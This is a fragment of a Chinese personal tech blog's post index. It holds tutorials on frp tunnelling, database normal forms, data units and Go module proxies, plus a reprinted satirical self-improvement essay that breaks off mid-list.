[花了一个星期，我终于把RPC框架整明白了！](https://developer.51cto.com/art/201906/597963.htm)\n\n","tags":["rpc"],"categories":["RPC"]},{"title":"frp内网穿透的实践","url":"%2Fp%2Fcc6fa0e8.html","content":"\n\n\n### 0. 为什么内网穿透\n\n从公网中访问自己的私有设备向来是一件难事儿。\n\n自己的主力台式机、NAS等等设备，它们可能处于路由器后，或者运营商因为IP地址短缺不给你分配公网IP地址。如果我们想直接访问到这些设备（远程桌面，远程文件，SSH等等），一般来说要通过一些转发或者P2P组网软件的帮助。\n\n<!-- more -->\n\n\n\n### 1. 安装配置 frp\n\nhttps://github.com/fatedier/frp/releases 下载最新的release\n\n##### 1.1服务端配置\n\n```bash\nsudo cp systemd/frps.service /lib/systemd/system/\n\n#  /usr/bin/frps -c /etc/frp/frps.ini\n# 我们按照 service 内的配置把文件拷贝到相应的地方\n\nsudo cp frps /usr/bin/frps\nsudo mkdir /etc/frp/\nsudo cp frps.ini /etc/frp/frps.ini\n\n# 编辑frps.ini\n\n\n# 开启 service\nsudo systemctl start frps\nsudo systemctl enable frps\n```\n\n\n\n##### 1.2 客户端\n\n```bash\nsudo cp systemd/frpc.service /lib/systemd/system/\n\nsudo cp frpc /usr/bin/frpc\nsudo mkdir /etc/frp/\nsudo cp frpc.ini /etc/frp/frpc.ini\n\n#编辑frpc.ini\n\n#1. 修改server_addr为服务端公网IP\n\n\n# 开启 service\nsudo systemctl start frpc\nsudo systemctl enable frpc\n```\n\n\n\n##### 1.3 测试\n\n主题frpc里面有ssh配置, 所以我们通过 ssh 访问内网机器：\n\n```bash\nssh -p 6000 root@49.234.15.70\n\n# 为了方便, 我们可以在~/.ssh/config 配置下面的话\n\nhost box\n    Hostname 49.234.15.70\n    Port 6000\n    user root\n```\n\n\n\n### 2. 自定义域名访问内网的 web 服务\n\n有时想要让其他人通过域名访问或者测试我们在本地搭建的 web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。\n\n\n\n##### 2.1 修改 frps.ini\n\n设置 http 访问端口为 8080：\n\n```ini\n# frps.ini\n[common]\nbind_port = 7000\nvhost_http_port = 8080\n```\n\n\n\n##### 2.2 启动 frps：\n\n```bash\nsudo systemctl start frps\n```\n\n\n\n##### 2.3 修改frpc.ini\n\n修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应的端口, 绑定自定义域名 `www.yourdomain.com`:\n\n\n\n```ini\n# frpc.ini\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[web]\ntype = http\nlocal_port = 80\ncustom_domains = www.yourdomain.com\n```\n\n\n\n##### 2.4 启动 frpc：\n\n```bash\nsudo systemctl start frpc\n```\n\n\n\n##### 2.5 绑定域名映射\n\n将 `www.yourdomain.com` 的域名 A 记录解析到 IP `x.x.x.x`，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。\n\n通过浏览器访问 `http://www.yourdomain.com:8080` 即可访问到处于内网机器上的 web 服务。\n\n\n\n### 3. frp 管理面板\n\n服务端 frps 配置如下:\n\n```ini\n[common]\nbind_port = 7000\ndashboard_port = 5000\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 5001\n```\n\n然后我们通过 ip:5000,即可以访问到 web 管理界面.\n\n\n\n### 4. nginx 反向代理进行无端口访问\n\n##### 4.1 frp 相应配置\n\n+ frps\n\n  ```ini\n  [common]\n  bind_port = 7000\n  dashboard_port = 5000\n  dashboard_user = admin\n  dashboard_pwd = admin\n  vhost_http_port = 5001\n  ```\n\n  \n\n+ frpc\n\n  ```ini\n  [web]\n  type = http\n  local_port = 80\n  custom_domains = box.frp.liuvv.com\n  ```\n\n\n\n##### 4.2 在服务端架设 nginx\n\n1、 frp.liuvv.com 做A记录，解析至IP；\n\n2、 *.frp.liuvv.com 做CNAME记录，解析至 frp.liuvv.com;\n\n3、 配置nginx反向代理,将来自*.frp.liuvv.com的80端口请求，分发至frp服务器http请求的监听端口。\n\n```nginx\nserver {\n\n    listen 80;\n\n    server_name frp.liuvv.com;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5000;# dashboard\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n\nserver {\n\n    listen 80;\n\n    server_name *.frp.liuvv.com;\n\n    access_log /var/log/nginx/frp_access.log;\n\n    error_log /var/log/nginx/frp_error.log;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5001;# vhost_http\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n```\n\n\n\n### 5.  远程桌面连接局域网mac\n\nmac去下载darwin_amd64,  然后启动客户端 frpc\n\n##### 5.1  开启屏幕共享\n\n在系统设置->共享->开启屏幕共享\n\n即开启了 vnc 服务\n\n\n\n##### 5.2 修改frpc配置\n\n```ini\n[common] \nserver_addr = 49.234.15.70\nserver_port = 7000\n\n[vnc] \ntype = tcp \nlocal_ip = 127.0.0.1 \nlocal_port = 5900 \nremote_port = 35900 \nuse_encryption = true \nuse_compression = true\n```\n\n\n\n##### 5.3 连接远程\n\n在 finder, cmd+k, 进行连接\n\n```ini\nvnc://49.234.15.70:35900\n```\n\n\n\n### 6. 参考资料:\n\n+ https://github.com/fatedier/frp/blob/master/README_zh.md\n\n+ https://www.iyuu.cn/archives/286/\n+ [实现MAC远程桌面](http://yuqiangcoder.com/2019/11/22/frp-内网穿透-实现MAC远程桌面.html)","tags":["frp"],"categories":["系统"]},{"title":"数据库范式和函数依赖","url":"%2Fp%2F2e33702e.html","content":"\n\n\n# 1. 函数依赖\n\n## 1.1 函数依赖(有我就能决定你)\n\n设X,Y是关系R的两个属性集合，当任何时刻R中的任意两个元组中的X属性值相同时，则它们的Y属性值也相同，则称X函数决定Y，或Y函数依赖于X。\n\n+ 在一个表中,  X的值确定的情况下，必定能确定属性Y的值,  这就是函数依赖名字的由来，类似于函数关系 y = f(x)\n+ 姓名函数依赖于学号，写作 **学号 → 姓名**。\n+ 不能说学号函数依赖于姓名。姓名 不能决定学号, 因为有重名.\n\n<!-- more -->\n\n---\n\n## 1.2. 平凡函数依赖(我决定的值还是我自己内部, 走不出自我, 于是平凡的我)\n\n当关系中属性集合Y是属性集合X的子集时(Y⊆X)，存在函数依赖X→Y，即一组属性函数决定它的所有子集，这种函数依赖称为平凡函数依赖。\n\n\n\n## 1.3 非平凡函数依赖(我决定的值大千世界)\n\n当关系中属性集合Y不是属性集合X的子集时，存在函数依赖X→Y，则称这种函数依赖为非平凡函数依赖。\n\n---\n\n## 1.4. 完全函数依赖 (我要和别人一起决定你)\n\n设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。\n\n+ （学号，课名）F→ 分数 （因为同一个的学号对应的分数不确定，同一个课名对应的分数也不确定）\n+ 自己一个人决定不了, 需要共同决定\n\n\n\n## 1.5. 部分函数依赖(我的一部分就能决定你)\n\n设X,Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分函数依赖于X。\n\n+ (学号，课名） P→ 姓名\n+ 我自己的一部分就可以决定\n\n\n\n## 1.6. 传递函数依赖 (我可以间接决定你)\n\n设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z，则称Z传递函数依赖于X。\n\n\n\n# 2. 码和主属性\n\n## 2.1 码\n\n设 K 为某表中的一个属性或属性组，若除 K 之外的所有属性都完全函数依赖于 K（这个“完全”不要漏了），那么我们称 K 为**候选码**，简称为**码**。\n\n在实际中我们通常可以理解为：假如当 K 确定的情况下，该表除 K 之外的所有属性的值也就随之确定，那么 K 就是码。一张表中可以有超过一个码。（实际应用中为了方便，通常选择其中的一个码作为主码）\n\n+ 2NF的图 **(学号、课名）**这个属性组就是码。该表中有且仅有这一个码。\n\n  \n\n## 2.2 主属性\n\n包含在任何一个码中的属性成为主属性。\n\n2NF的图主属性就有两个，**学号** 与 **课名**。\n\n\n\n# 3. 范式\n\n关系数据库有六种，1NF，2NF，3NF，BCNF，4NF，5NF。\n\n## 3.1 1NF (问题: 同字段内容重复, 要拆表->2NF)\n\n符合1NF的关系中的每个属性都不可再分。下图就不符合1NF的要求.\n\n![1](数据库范式和函数依赖/1.png)\n\n1NF是关系模式应具备的最起码的条件，如果数据库设计不能满足第一范式，就不能称为关系型数据库。关系数据库自带1NF\n\n![1](数据库范式和函数依赖/2.png)\n\n\n\n## 3.2 2NF (问题: 非主属性不同字段之间关联, 要拆表->3NF)\n\n![1](数据库范式和函数依赖/3.png)\n\n+ 每一名学生的学号、姓名、系名、系主任这些数据重复多次。每个系与对应的系主任的数据也重复多次——**数据冗余过大** \n\n+ 假如学校新建了一个系，但是暂时还没有招收任何学生（比如3月份就新建了，但要等到8月份才招生），那么是无法将系名与系主任的数据单独地添加到数据表中去的——**插入异常**\n\n+ 假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。——**删除异常**\n\n+ 假如李小明转系到法律系，那么为了保证数据库中数据的一致性，需要修改三条记录中系与系主任的数据。——**修改异常**。\n\n  正因为仅符合1NF的数据库设计存在着这样那样的问题，我们需要提高设计标准，去掉导致上述四种问题的因素，使其符合更高一级的范式（2NF），这就是所谓的“规范化”。\n\n  \n\n  #### 3.2.1  判断是否符合2NF\n\n  根据2NF的定义，判断的依据实际上就是看数据表中**是否存在非主属性对于码的部分函数依赖**。若存在，则数据表最高只符合1NF的要求，若不存在，则符合2NF的要求。判断的方法是：\n\n  \n\n  > 第一步：找出数据表中所有的**码**。\n  \n  + 查看所有每一单个属性，当它的值确定了，是否剩下的所有属性值都能确定。\n  + 查看所有包含有两个属性的属性组，当它的值确定了，是否剩下的所有属性值都能确定。\n+ 依次查看3个4个5个.....\n  + 看起来很麻烦是吧，但是这里有一个诀窍，就是假如A是码，那么所有包含了A的属性组，如（A，B）、（A，C）、（A，B，C）等等，都不是码了（因为作为码的要求里有一个“**完全**函数依赖”）。\n\n  ![1](数据库范式和函数依赖/4.png)\n\n  这一步完成以后，可以得到，表3的码只有一个，就是**（学号、课名）**。学号并不能直接决定分数, 所以学号+课名能决定一切\n\n  \n\n  > 第二步：根据第一步所得到的码，找出所有的**主属性**。\n  \n  主属性有两个：**学号** 与 **课名**\n  \n  > 第三步：数据表中，除去所有的主属性，剩下的就都是**非主属性**了。\n  \n  非主属性有四个：**姓名**、**系名**、**系主任**、**分数**\n  \n  > 第四步：查看是否存在非主属性对码的**部分函数依赖**。\n  \n  对于**（学号，课名） → 姓名**，有 **学号 → 姓名**，\t\t存在非主属性 姓名 对码**（学号，课名）**的部分函数依赖。\n  对于**（学号，课名） → 系名**，有 **学号 → 系名**，\t\t存在非主属性 系名 对码**（学号，课名）**的部分函数依赖。\n  对于**（学号，课名） → 系主任**，有 **学号 → 系主任**，存在非主属性 系主任 对码**（学号，课名）**的部分函数依赖。\n  \n  所以表3存在非主属性对于码的部分函数依赖，最高只符合1NF的要求，不符合2NF的要求。\n\n\n\n#### 3.2.2  拆表符合2NF\n\n为了符合2NF的要求，我们必须消除这些部分函数依赖，只有一个办法，就是将大数据表拆分成两个或者更多个更小的数据表，在拆分的过程中，要达到更高一级范式的要求，这个过程叫做”模式分解“。模式分解的方法不是唯一的，以下是其中一种方法：\n选课表（学号，课名，分数）\n学生表（学号，姓名，系名，系主任）\n\n我们先来判断以下，**选课**表与**学生**表，是否符合了2NF的要求？\n\n对于**选课**表，其码是**（学号，课名）**，主属性是**学号**和**课名**，非主属性是**分数**，**学号**确定，并不能唯一确定**分数**，**课名**确定，也不能唯一确定**分数**，所以不存在非主属性**分数**对于码 **（学号，课名）**的部分函数依赖，所以此表符合2NF的要求。\n\n对于**学生**表，其码是**学号，**主属性是**学号**，非主属性是**姓名、系名**和**系主任**，因为码只有一个属性，所以不可能存在非主属性对于码 的部分函数依赖，所以此表符合2NF的要求。\n\n![1](数据库范式和函数依赖/5.png)\n\n\n\n#### 3.2.3 定义\n\n如果关系模式R是1NF，且每一个非主属性完全依赖于候选建，那么就称R是第二范式。\n\n第二范式要满足的条件：首先要满足第一范式，其次每一个非主属性要**完全函数**依赖于候选键，或者是主键。也就是说，每个非主属性是由整个主键函数决定的，而不能有主键的一部分来决定。\n\n\n\n## 3.3 3NF (问题: 主属性不同字段之间关联, 要拆表->BCNF)\n\n![1](数据库范式和函数依赖/6.png)\n\n+ 李小明转系到法律系\n  只需要修改一次李小明对应的系的值即可。——有改进\n\n+ 数据冗余是否减少了？\n  学生的姓名、系名与系主任，不再像之前一样重复那么多次了。——有改进\n\n+ 删除某个系中所有的学生记录\n  该系的信息仍然全部丢失。——无改进\n\n+ 插入一个尚无学生的新系的信息。\n  因为学生表的码是学号，不能为空，所以此操作不被允许。——无改进\n\n  \n\n所以说，仅仅符合2NF的要求，很多情况下还是不够的，而出现问题的原因，在于仍然存在非主属性**系主任**对于码**学号**的传递函数依赖。为了能进一步解决这些问题，我们还需要将符合2NF要求的数据表改进为符合3NF的要求。\n\n**第三范式（3NF）** **3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖**。也就是说， 如果存在非主属性对于码的传递函数依赖，则不符合3NF的要求。\n\n\n\n#### 3.3.1 判断是否符合3NF\n\n接下来我们看看表中的设计，是否符合3NF的要求。\n\n+ 对于**选课**表，主码为（学号，课名），主属性为**学号**和**课名，**非主属性只有一个，为分数，不可能存在传递函数依赖，所以**选课**表的设计，符合3NF的要求。\n\n+ 对于**学生**表，主码为**学号**，主属性为**学号**，非主属性为**姓名**、**系名**和**系主任**。因为 学号 → 系名，同时 系名 → 系主任，所以存在非主属性**系主任**对于码**学号**的传递函数依赖，所以**学生**表的设计，不符合3NF的要求。。\n\n  \n\n#### 3.3.2  拆表符合3NF\n\n为了让数据表设计达到3NF，我们必须进一步进行模式分解为以下形式：\n选课（学号，课名，分数）\n学生（学号，姓名，系名）\n系（系名，系主任）\n\n\n\n+ 对于**选课**表，符合3NF的要求，之前已经分析过了。\n\n+ 对于**学生**表，码为**学号**，主属性为**学号**，非主属性为**系名**，不可能存在非主属性对于码的传递函数依赖，所以符合3NF的要求。\n\n+ 对于**系**表，码为**系名**，主属性为**系名**，非主属性为**系主任**，不可能存在非主属性对于码的传递函数依赖（至少要有三个属性才可能存在传递函数依赖关系），所以符合3NF的要求。。\n\n\n\n![1](数据库范式和函数依赖/7.png)\n\n\n\n![1](数据库范式和函数依赖/8.png)\n\n\n\n现在我们来看一下，进行同样的操作，是否还存在着之前的那些问题？\n\n1. 删除某个系中所有的学生记录\n   该系的信息不会丢失。——有改进\n2. 插入一个尚无学生的新系的信息。\n   因为系表与学生表目前是独立的两张表，所以不影响。——有改进\n3. 数据冗余更加少了。——有改进\n\n\n\n由此可见，符合3NF要求的数据库设计，**基本**上解决了数据冗余过大，插入异常，修改异常，删除异常的问题。当然，在实际中，往往为了性能上或者应对扩展的需要，经常 做到2NF或者1NF，但是作为数据库设计人员，至少应该知道，3NF的要求是怎样的。\n\n\n\n#### 3.3.3 定义\n\n如果关系模式R是2NF，且关系模式R（U,F）中的所有非主属性对任何候选关键字都不存在传递依赖，则称关系R是属于第三范式。\n\n第三范式（3NF）；符合2NF，并且，消除传递依赖。\n\n\n\n## 3.4 BCNF\n#### 3.4.1 3NF 也会有一些问题\n\n1. 某公司有若干个仓库；\n2. 每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作；\n3. 一个仓库中可以存放多种物品，一种物品也可以存放在不同的仓库中。每种物品在每个仓库中都有对应的数量。\n\n那么关系模式 仓库（仓库名，管理员，物品名，数量） 属于哪一级范式？\n\n已知函数依赖集：仓库名 → 管理员，管理员 → 仓库名，（仓库名，物品名）→ 数量\n码：（管理员，物品名），（仓库名，物品名）\n主属性：仓库名、管理员、物品名\n非主属性：数量\n\n∵ 不存在非主属性对码的部分函数依赖和传递函数依赖。∴ 此关系模式属于3NF。\n\n![1](数据库范式和函数依赖/9.png)\n\n好，既然此关系模式已经属于了 3NF，那么这个关系模式是否存在问题呢？我们来看以下几种操作：\n\n1. 先新增加一个仓库，但尚未存放任何物品，是否可以为该仓库指派管理员？——不可以，因为物品名也是主属性，根据实体完整性的要求，主属性不能为空。\n2. 某仓库被清空后，需要删除所有与这个仓库相关的物品存放记录，会带来什么问题？——仓库本身与管理员的信息也被随之删除了。\n3. 如果某仓库更换了管理员，会带来什么问题？——这个仓库有几条物品存放记录，就要修改多少次管理员信息。\n\n从这里我们可以得出结论，在某些特殊情况下，即使关系模式符合 3NF 的要求，仍然存在着插入异常，修改异常与删除异常的问题，仍然不是 ”好“ 的设计。\n\n\n\n#### 3.3.2  拆表符合BCNF\n\n造成此问题的原因：存在着**主属性**对于码的部分函数依赖与传递函数依赖。\n\n（在此例中就是存在主属性【仓库名】对于码【（管理员，物品名）】的部分函数依赖。\n\n解决办法就是要在 3NF 的基础上消除**主属性**对于码的部分与传递函数依赖。\n\n\n\n仓库（仓库名，管理员）\n库存（仓库名，物品名，数量）\n\n这样，之前的插入异常，修改异常与删除异常的问题就被解决了。\n\n\n\n#### 3.4.3 定义\n\n符合3NF，并且，主属性不依赖于主属性。若关系模式R属于第一范式，且每个属性都不传递依赖于键码，则R属于BC范式。\n\n\n\n## 3.5 总结\n\n应用的范式越高，则表越多。表多会带来很多问题：1 查询时要连接多个表，增加了查询的复杂度. 2 查询时需要连接多个表，降低了数据库查询性能\n\n所以有的时候需要应用反范式化\n\n+ 2NF在1NF的基础之上，消除了**非主属性**对于码的部分函数依赖。\n+ 3NF在2NF的基础之上，消除了**非主属性**对于码的传递函数依赖。\n+ BCNF 在3NF的基础上，消除**主属性**对于码的部分与传递函数依赖。\n\n\n\n# 4. 头脑风暴\n\n+ 1NF, 数据库默认就是, 不用考虑\n+ 2NF  码可以决定一切, 但是不能一部分就决定.  (AB->CD) 但是 (A->C)    不能这样, 要改\n+ 3NF  码可以决定一切, 但是不能间接决定.          (A->B->C)  不能这样, 要改\n+ BCNF 码自己的主属性相互依赖,先解决自己的依赖成为 BCNF       (AB->CD)   但是 (A->B) , 要改\n\n\n\n# 5. 参考资料\n\n+ https://www.zhihu.com/question/24696366/answer/29189700\n+ https://www.cnblogs.com/rosesmall/p/9585655.html","tags":["sql"],"categories":["sql"]},{"title":"文件大小和网速的单位","url":"%2Fp%2F3160c079.html","content":"\n\n\n### 1. 比特\n\n计算机发出的信号都是数字形式的, 比特(bit)来源于 `binary digit`, 意思是一个二进制数字. 因此一个比特就是二进制数字中的一个1 或 0.\n\n<!-- more -->\n\n### 2. 网络速率(1000)\n\n速率是计算机网络中最重要的一个性能指标,  速率的单位是 `bit/s` | `b/s` |` bps`  (比特每秒)\n\n+ k = 10的3次方  (kbit/s)\n\n+ M = 10的6次方 (Mbit/s)\n+ G = 10的9次方\n+ T = 10的12次方\n+ .......(1000单位)\n\n\n\n### 3. 计算机存储(1024*8)\n\n计算机的数据量常常用 B 作为度量的单位(B代表byte), 通常一个字节代表8个比特.\n\n+ K = 2的10次方\n+ M = 2的20次方\n+ G = 2的30次方\n+ T = 2的40次方\n+ .......(1024单位)\n\n\n\n### 4. 总结\n\n\n\n##### 4.1 计算\n\n> 15G的数据块以10G 的速率传送, 需要多少时间? \n\n表明有 15 * 2的30次方 * 8 `比特`的数据块以 10 * 10的9次方 `b/s` 的速率传送, 两个相除就是时间\n\n\n\n##### 4.2 区分\n\n+ 在计算机领域中, 所有的单位都使用大写字母(K, M, G....)\n+ 在通信领域中, 只有1000使用 k, 其余的都用大写(M, G....)\n+ 有的不严格区分, 大写的 K 即可以表示1000, 也可以表示1024\n\n \n\n##### 4.3 生活常识\n\n我们说的几M带宽是以比特为单位的，而我们常看到的下载速度显示的几KB是以字节为单位\n\n100M的网的话理论下载速度:\n\n100×1000×1000＝100000000位，因为8个位等于1个字节，所以这个速度每秒可下载\n\n100000000位÷8=12500000字节，而1024字节＝1K字节，所以换算结果：\n\n12500000字节÷1024≈12207.03K字节，1024K字节就等于1M字节，换算结果：\n\n12207.03K字节÷1024≈11.92M\n\n\n\n有的计算方式是直接除以8, 是12.5M\n\n\n\n### 5. 参考资料 \n\n+ 计算机网络第7版(谢希仁)","tags":["单位"],"categories":["计算机基础"]},{"title":"goproxy的部署实践","url":"%2Fp%2F74b41bb2.html","content":"\n### 0. 前言\n\n在大陆地区我们无法直接通过 `go get` 命令获取到一些第三方包，最常见的就是 `golang.org/x` 下面的各种优秀的包. 解决方案如下:\n\n```bash\n# go.1.12.x\nexport GO111MODULE=on\nexport GOPROXY=https://goproxy.cn\n\n# go1.13.x\ngo env -w GOPROXY=https://goproxy.cn,direct\ngo env -w GOPRIVATE=*.corp.example.com \n\n#GOPRIVATE=*.corp.example.com 表示所有模块路径以 corp.example.com 的下一级域名 (如 team1.corp.example.com) 为前缀的模块版本都将不经过 Go module proxy 和 Go checksum database，需要注意的是不包括 corp.example.com 本身。\n```\n\n<!-- more -->\n\n\n\n本文将重点介绍 go module 的 proxy 配置实现，包括如下两种的代理配置：\n\n- GOPROXY\n- Athens\n\n### 1.  goproxy\n\nhttps://github.com/goproxyio/goproxy\n\n\n\n##### 1.1 安装go\n\n```bash\nwget https://dl.google.com/go/go1.13.4.linux-amd64.tar.gz #下载go\nsudo tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz # 解压到/usr/local\nexport PATH=$PATH:/usr/local/go/bin # 设置环境变量\ngo version # go version go1.13.4 linux/amd64\n```\n\n\n\n##### 1.2 安装goproxy\n\n```bash\ngit clone https://github.com/goproxyio/goproxy.git\ncd goproxy/\nmake\n```\n\n\n\n##### 1.3 代理\n\n```bash\n# 服务端执行\n./bin/goproxy -cacheDir=/tmp/test -listen=0.0.0.0:8082 \n\n\n# 客户端操作\nGOPROXY=http://服务端ip:8082 go get -v github.com/spf13/cobra # 会缓存在服务端/tmp/test目录下\n```\n\n\n\n##### 1.4 nginx配置\n\n```nginx\n./bin/goproxy -cacheDir=/tmp/test -listen :8082 -proxy https://goproxy.cn -exclude liuvv.com\n\n\nserver {\n    server_name goproxy.liuvv.com;\n    listen 80 ;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/goproxy_access_log;\n    error_log /var/log/nginx/goproxy_error_log notice;\n\n    location  / {\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_connect_timeout 300s;\n        proxy_send_timeout 300s;\n        proxy_read_timeout 300s;\n\n        proxy_pass             http://127.0.0.1:8082;\n    }\n}\n```\n\n\n\n### 2.  Athens\n\nhttps://github.com/gomods/athens\n\n\n\n```bash\ngit clone https://github.com/gomods/athens \ncd athens \n\nmake build-ver VERSION=\"0.7.0\" # 如果下载不下来, 修改makefile的goproxy\n./athens -version\n```\n\n\n\n服务器启动\n\n```bash\nexport ATHENS_STORAGE_TYPE=disk  # 缓存到硬盘\nexport ATHENS_DISK_STORAGE_ROOT=~/athens-storage\n./athens\n```\n\n\n\n客户端测试\n\n```bash\nexport GO111MODULE=on export GOPROXY=http:#服务器ip:3000\n\n\ngit clone https://github.com/athens-artifacts/walkthrough.git \ncd walkthrough\ngo run .  # 会缓存在服务端~/athens-storage目录下\n\n\ncurl 服务器ip:3000/github.com/athens-artifacts/samplelib/@v/list\n```\n\n\n\n### 3. 参考资料\n\n+ [Hello，Go module proxy](https://tonybai.com/2018/11/26/hello-go-module-proxy/)\n+ [Go Module Proxy](https://juejin.im/post/5c8f9f8ef265da612c3a34b9)\n+ https://blog.wolfogre.com/posts/golang-package-history/\n+ https://juejin.im/post/5d8ee2db6fb9a04e0b0d9c8b\n+ https://github.com/goproxy/goproxy.cn/","tags":["golang"],"categories":["golang"]},{"title":"【转载】如何超过大多数人","url":"%2Fp%2F48fcb916.html","content":"\n\n\n当你看到这篇文章的标题，你一定对这篇文章产生了巨大的兴趣，因为你的潜意识在告诉你，这是一本人生的“武林秘籍”，而且还是左耳朵写的，一定有干货满满，只要读完，一定可以练就神功并找到超过大多数人的快车道和捷径……然而…… 当你看到我这样开篇时，你一定会觉得我马上就要有个转折，告诉你这是不可能的，一切都需要付出和努力……然而，你错了，这篇文章还真就是一篇“秘籍”，只要你把这些“秘籍”用起来，你就一定可以超过大多数人。而且，这篇文章只有我这个“人生导师”可以写得好。毕竟，我的生命过到了十六进制2B的年纪，踏入这个社会已超过20年，舍我其谁呢？！\n\nP.S. 这篇文章借鉴于《[如何写出无法维护的代码](https://coolshell.cn/articles/4758.html)》一文的风格……嘿嘿\n\n<!-- more -->\n\n\n\n### 1. 相关技巧和最佳实践\n\n要超过别人其实还是比较简单的，尤其在今天的中国，更是简单。因为，你只看看中国的互联网，你就会发现，他们基本上全部都是在消费大众，让大众变得更为地愚蠢和傻瓜。**所以，在今天的中国，你基本上不用做什么，只需要不使用中国互联网，你就很自然地超过大多数人了**。当然，如果你还想跟他们彻底拉开，甩他们几个身位，把别人打到底层，下面的这些“技巧”你要多多了解一下。\n\n在信息获取上，你要不断地向大众鼓吹下面的这些事：\n\n- 让大家都用百度搜索引擎查找信息，订阅微信公众号或是到知乎上学习知识……要做到这一步，你就需要把“百度一下”挂在嘴边，然后要经常在群或朋友圈中转发微信公众号的文章，并且转发知乎里的各种“如何看待……”这样的文章，让他们**爱上八卦**，**爱上转发**，**爱上碎片**。\n- 让大家到微博或是知识星球上粉一些大咖，密切关注他们的言论和动向……是的，告诉大家，大咖的任何想法一言一行都可以在微博、朋友圈或是知识星球上获得，让大家相信，你的成长和大咖的见闻和闲扯非常有关系，你跟牛人在一个圈子里你也会变牛。\n- 把今日头条和抖音这样的APP推荐给大家……你只需要让你有朋友成功地安装这两个APP，他们就会花大量的时间在上面，而不能自拔，要让他们安装其实还是很容易的，你要不信你就装一个试玩一会看看（嘿嘿嘿）。\n- 让大家热爱八卦，八卦并不一定是明星的八卦，还可以是你身边的人，比如，公司的同事，自己的同学，职场见闻，社会热点，争议话题，……**这些东西总有一些东西会让人心态有很多微妙的变化，甚至花大量的时间去搜索和阅读大量的观点，以及花大量时间与人辩论争论，这个过程会让人上瘾，让人欲罢不能，然而这些事却和自己没有半毛钱关系。你要做的事就是转发其中一些SB或是很极端的观点，造成大家的一睦讨论后，就早早离场……**\n- 利用爱国主义，让大家觉得不用学英文，不要出国，不要翻墙，咱们已经是强国了……这点其实还是很容易做到的，因为学习是比较逆人性的，所以，只要你鼓吹那些英文无用论，出国活得更惨，国家和民族都变得很强大，就算自己过得很底层，也有大国人民的感觉。\n\n然后，在知识学习和技能训练上，让他们不得要领并产生幻觉\n\n- 让他们**混淆认识和知识**，以为开阔认知就是学习，让他们有学习和成长的幻觉……\n- 培养他们要学会使用碎片时间学习。**等他们习惯利用碎片时间吃快餐后，他们就会失去精读一本书的耐性……**\n- 不断地给他们各种各样“有价值的学习资料”，让他们抓不住重点，成为一个微信公众号或电子书“收藏家”……\n- 让他们看一些枯燥无味的基础知识和硬核知识，这样让他们只会用“死记硬背”的方式来学习，甚至直接让他们失去信心，直接放弃……\n- 玩具手枪是易用的，重武器是难以操控的，多给他们一些玩具，这样他们就会对玩具玩地得心应手，觉得玩玩具就是自己的专业……\n- 让他们喜欢直接得到答案的工作和学习方式，成为一个伸手党，从此学习再也不思考……\n- 告诉他们东西做出来就好了，不要追求做漂亮，做优雅，这样他们就会慢慢地变成劳动密集型……\n- 让他们觉得自己已经很努力了，剩下的就是运气，并说服他们去‘及时行乐’，然后再也找不到高阶和高效率学习的感觉……\n- 让他们觉得“读完书”、“读过书”就行了，不需要对书中的东西进行思考，进行总结，或是实践，只要囫囵吞枣尽快读完就等同于学好了……\n\n最后，在认知和格局上，彻底打垮他们，让他们变成韭菜。\n\n- 让他们不要看到大的形势，只看到眼前的一亩三分地，做好一个井底之蛙。其实这很简单，比如，你不要让他们看到整个计算机互联网技术改变人类社会的趋势，你要多让他看到，从事这一行业的人有多苦逼，然后再说一下其它行业或职业有多好……\n- 宣扬一夜暴富以及快速挣钱的案例，**最好让他们进入“赌博类”或是“传销类”的地方，比如：股市、数字货币……要让他们相信各种财富神话，相信他们就是那个幸运儿，**他们也可以成为巴菲特，可以成为马云……\n- 告诉他们，一些看上去很难的事都是有捷径的，比如：21天就能学会机器学习，用区块链就能颠覆以及重构整个世界等等……\n- 多跟他们讲一些小人物的励志的故事，这样让他们相信，不需要学习高级知识，不需要掌握高级技能，只需要用低等的知识和低级的技能，再加上持续不断拼命重复现有的工作，终有一天就会成功……\n- 多让他们跟别人比较，**人比人不会气死人，但是会让人变得浮躁，变得心急，变得焦虑，当一个人没有办法控制自己的情绪，没有办法让自己静下心来，人会失去耐性和坚持，开始好大喜欢功，开始装逼，开始歪门邪道剑走偏锋……**\n- 让他们到体制内的一些非常稳定的地方工作，这样他们拥有不思进取、怕承担责任、害怕犯错、喜欢偷懒、得过且过的素质……\n- 让他们到体制外的那些喜欢拼命喜欢加班的地方工作，告诉他们爱拼才会赢，努力加班是一种福报，青春就是用来拼的，让他们喜欢上使蛮力的感觉……\n- 告诉他们你的行业太累太辛苦，干不到30岁。让他们早点转行，不要耽误人生和青春……\n- 